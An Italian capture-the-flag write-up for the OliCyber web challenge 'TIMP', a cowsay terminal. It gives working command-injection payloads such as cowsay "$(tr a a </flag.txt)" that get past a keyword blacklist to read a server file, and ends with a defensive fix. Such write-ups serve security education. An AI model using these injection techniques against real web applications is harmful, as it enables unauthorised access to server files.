# TIMP (Terminale Inhackerabile della Mucca Parlante)

**Competizione:** OliCyber <br>
**Categoria:** Web <br>
**URL:** http://timp.challs.olicyber.it

---

## Descrizione

> Benvenuti nel TIMP (Terminale Inhackerabile della Mucca Parlante)
Unico scopo di questo terminale è far dire cose ad una mucca :) Riuscirai a leggere la flag?
...Ovviamente no. Ma puoi provarci! La flag si trova in /flag.txt
PS: le soluzioni a questa challenge sono molteplici, provate a trovarne più di una!

Un terminale web che permette di far parlare una mucca con `cowsay`. L'obiettivo è leggere `/flag.txt` aggirando una blacklist di comandi e caratteri.

---

## Soluzione

### 1. Analisi del source — handler.php

Il backend applica i seguenti filtri:

- **Caratteri bloccati:** `#@%^&*_+[]:>?~\\`
- **Lunghezza massima:** 70 caratteri
- **Keyword bloccate:** `cat`, `head`, `tail`, `od`, `less`, `hexdump`, `echo`, `sudo`
- **Spazi:** bloccati fuori dal path `cowsay`
- **Output troncato a 10 char** quando passa da `exec()`

### 2. Vulnerabilità — Command Injection via `cowsay`

Il path `cowsay` è l'unico che usa `passthru()` (output completo non troncato) e costruisce il comando così:

```php
$result = passthru('cowsay "'.addslashes($str).'"');
```

`addslashes` escapa solo `"`, `'` e `\`, ma **non blocca la command substitution** `$()`. È quindi possibile iniettare comandi arbitrari dentro i doppi apici.

### 3. Exploit

Per leggere `/flag.txt` senza usare `cat` o altri comandi bloccati, si usa `tr` in modalità pass-through:

```
cowsay "$(tr a a </flag.txt)"
```

`tr a a` traduce `a` in `a`, di fatto copia lo stdin all'stdout senza modifiche, funzionando come `cat` ma non essendo nella blacklist. Il server costruisce:

```bash
cowsay "$(tr a a </flag.txt)"
```

La shell esegue prima la substitution, il contenuto di `/flag.txt` viene inserito come argomento di `cowsay` e stampato nella mucca.

**Altre alternative** potevano essere:
```bash
cowsay "$(tac /flag.txt)"
cowsay "$(rev /flag.txt)"
cowsay "$(grep . /flag.txt)"
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

La blacklist è bypassabile perché:

1. `passthru()` non sanifica l'input dalla command substitution `$()`
2. `addslashes` non è sufficiente contro injection shell
3. Esistono molti sostituti di `cat` non inclusi nella blacklist (`tr`, `tac`, `rev`, `grep`)

**Fix corretto:** non costruire mai comandi shell con input utente. Usare `escapeshellarg()` sull'intero argomento oppure reimplementare `cowsay` in PHP puro.